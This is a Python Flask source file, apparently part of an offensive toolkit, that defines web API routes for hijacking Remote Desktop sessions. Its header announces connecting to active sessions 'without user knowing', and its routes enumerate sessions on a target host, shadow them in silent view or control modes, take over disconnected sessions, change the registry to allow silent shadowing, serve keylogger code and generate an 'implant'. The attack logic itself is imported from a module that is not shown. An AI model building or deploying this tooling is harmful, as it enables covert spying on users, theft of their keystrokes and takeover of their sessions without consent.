"""
RDP Hijacking - Shadow Session Flask Routes
Connect to Active Sessions Without User Knowing
"""

from flask import Blueprint, render_template, request, jsonify
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

try:
    from rdp_hijack import get_hijacker, HijackMode, SessionState
except ImportError:
    get_hijacker = None

rdp_hijack_bp = Blueprint('rdp_hijack', __name__, url_prefix='/rdp-hijack')


@rdp_hijack_bp.route('/')
def index():
    """RDP Hijacker main page"""
    return render_template('rdp_hijack.html')


@rdp_hijack_bp.route('/api/enumerate', methods=['POST'])
def enumerate_sessions():
    """Enumerate RDP sessions on target"""
    if not get_hijacker:
        return jsonify({"error": "RDP Hijacker module not available"}), 500
        
    data = request.get_json() or {}
    target_host = data.get('target_host')
    credentials = data.get('credentials')
    
    if not target_host:
        return jsonify({"error": "target_host required"}), 400
        
    hijacker = get_hijacker()
    machine = hijacker.enumerate_sessions(target_host, credentials)
    
    return jsonify({
        "success": True,
        "machine": {
            "machine_id": machine.machine_id,
            "hostname": machine.hostname,
            "ip_address": machine.ip_address,
            "os_version": machine.os_version,
            "rdp_enabled": machine.rdp_enabled,
            "nla_enabled": machine.nla_enabled,
            "shadow_allowed": machine.shadow_allowed,
            "sessions": [{
                "session_id": s.session_id,
                "username": s.username,
                "domain": s.domain,
                "client_ip": s.client_ip,
                "client_name": s.client_name,
                "state": s.state.value,
                "logon_time": s.logon_time,
                "idle_time": s.idle_time,
                "is_admin": s.is_admin,
                "can_shadow": s.can_shadow
            } for s in machine.sessions]
        }
    })


@rdp_hijack_bp.route('/api/shadow', methods=['POST'])
def shadow_session():
    """Shadow an active RDP session"""
    if not get_hijacker:
        return jsonify({"error": "RDP Hijacker module not available"}), 500
        
    data = request.get_json() or {}
    machine_id = data.get('machine_id')
    session_id = data.get('session_id')
    mode = data.get('mode', 'control')
    
    if not machine_id or session_id is None:
        return jsonify({"error": "machine_id and session_id required"}), 400
        
    # Map mode string to enum
    mode_map = {
        'view': HijackMode.VIEW_ONLY,
        'control': HijackMode.FULL_CONTROL,
        'silent_view': HijackMode.SILENT_VIEW,
        'silent_control': HijackMode.SILENT_CONTROL
    }
    hijack_mode = mode_map.get(mode, HijackMode.FULL_CONTROL)
    
    hijacker = get_hijacker()
    
    try:
        hijack = hijacker.shadow_session(machine_id, session_id, hijack_mode)
        
        return jsonify({
            "success": True,
            "hijack": {
                "hijack_id": hijack.hijack_id,
                "mode": hijack.mode.value,
                "status": hijack.status,
                "connected_at": hijack.connected_at,
                "target": {
                    "username": hijack.target_session.username,
                    "domain": hijack.target_session.domain
                }
            }
        })
    except ValueError as e:
        return jsonify({"error": str(e)}), 400


@rdp_hijack_bp.route('/api/generate-commands', methods=['POST'])
def generate_commands():
    """Generate shadow session commands"""
    if not get_hijacker:
        return jsonify({"error": "RDP Hijacker module not available"}), 500
        
    data = request.get_json() or {}
    machine_id = data.get('machine_id')
    session_id = data.get('session_id')
    mode = data.get('mode', 'control')
    
    if not machine_id:
        return jsonify({"error": "machine_id required"}), 400
        
    hijacker = get_hijacker()
    machine = hijacker.targets.get(machine_id)
    
    if not machine:
        return jsonify({"error": "Machine not found"}), 404
        
    # Find session
    target_session = None
    for s in machine.sessions:
        if s.session_id == session_id:
            target_session = s
            break
            
    if not target_session:
        return jsonify({"error": "Session not found"}), 404
        
    mode_map = {
        'view': HijackMode.VIEW_ONLY,
        'control': HijackMode.FULL_CONTROL,
        'silent_view': HijackMode.SILENT_VIEW,
        'silent_control': HijackMode.SILENT_CONTROL
    }
    hijack_mode = mode_map.get(mode, HijackMode.FULL_CONTROL)
    
    commands = hijacker.generate_shadow_command(machine, target_session, hijack_mode)
    
    return jsonify({
        "success": True,
        "commands": commands
    })


@rdp_hijack_bp.route('/api/takeover', methods=['POST'])
def takeover_disconnected():
    """Take over disconnected session"""
    if not get_hijacker:
        return jsonify({"error": "RDP Hijacker module not available"}), 500
        
    data = request.get_json() or {}
    machine_id = data.get('machine_id')
    session_id = data.get('session_id')
    
    if not machine_id or session_id is None:
        return jsonify({"error": "machine_id and session_id required"}), 400
        
    hijacker = get_hijacker()
    result = hijacker.takeover_disconnected_session(machine_id, session_id)
    
    if "error" in result:
        return jsonify(result), 400
        
    return jsonify({
        "success": True,
        "takeover": result
    })


@rdp_hijack_bp.route('/api/enable-silent-shadow', methods=['POST'])
def enable_silent_shadow():
    """Enable silent shadow via registry modification"""
    if not get_hijacker:
        return jsonify({"error": "RDP Hijacker module not available"}), 500
        
    data = request.get_json() or {}
    target_host = data.get('target_host')
    
    if not target_host:
        return jsonify({"error": "target_host required"}), 400
        
    hijacker = get_hijacker()
    result = hijacker.enable_silent_shadow(target_host)
    
    return jsonify({
        "success": True,
        "silent_shadow_config": result
    })


@rdp_hijack_bp.route('/api/capture-keystrokes', methods=['POST'])
def capture_keystrokes():
    """Get keylogger code for shadow session"""
    if not get_hijacker:
        return jsonify({"error": "RDP Hijacker module not available"}), 500
        
    data = request.get_json() or {}
    hijack_id = data.get('hijack_id')
    
    if not hijack_id:
        return jsonify({"error": "hijack_id required"}), 400
        
    hijacker = get_hijacker()
    result = hijacker.capture_session_keystrokes(hijack_id)
    
    if "error" in result:
        return jsonify(result), 400
        
    return jsonify({
        "success": True,
        "capture_tools": result
    })


@rdp_hijack_bp.route('/api/generate-implant', methods=['POST'])
def generate_implant():
    """Generate RDP hijacking implant"""
    if not get_hijacker:
        return jsonify({"error": "RDP Hijacker module not available"}), 500
        
    data = request.get_json() or {}
    implant_type = data.get('type', 'powershell')
    
    hijacker = get_hijacker()
    implant_code = hijacker.generate_implant(implant_type)
    
    return jsonify({
        "success": True,
        "implant_type": implant_type,
        "code": implant_code
    })


@rdp_hijack_bp.route('/api/techniques', methods=['GET'])
def get_techniques():
    """Get all RDP hijacking techniques"""
    if not get_hijacker:
        return jsonify({"error": "RDP Hijacker module not available"}), 500
        
    hijacker = get_hijacker()
    techniques = hijacker.get_attack_techniques()
    
    return jsonify({
        "success": True,
        "techniques": techniques
    })


@rdp_hijack_bp.route('/api/modes', methods=['GET'])
def get_modes():
    """Get available hijack modes"""
    return jsonify({
        "success": True,
        "modes": [{"value": m.value, "name": m.name} for m in HijackMode]
    })


@rdp_hijack_bp.route('/api/statistics', methods=['GET'])
def get_statistics():
    """Get hijacker statistics"""
    if not get_hijacker:
        return jsonify({"error": "RDP Hijacker module not available"}), 500
        
    hijacker = get_hijacker()
    stats = hijacker.get_session_stats()
    
    return jsonify({
        "success": True,
        "statistics": stats
    })
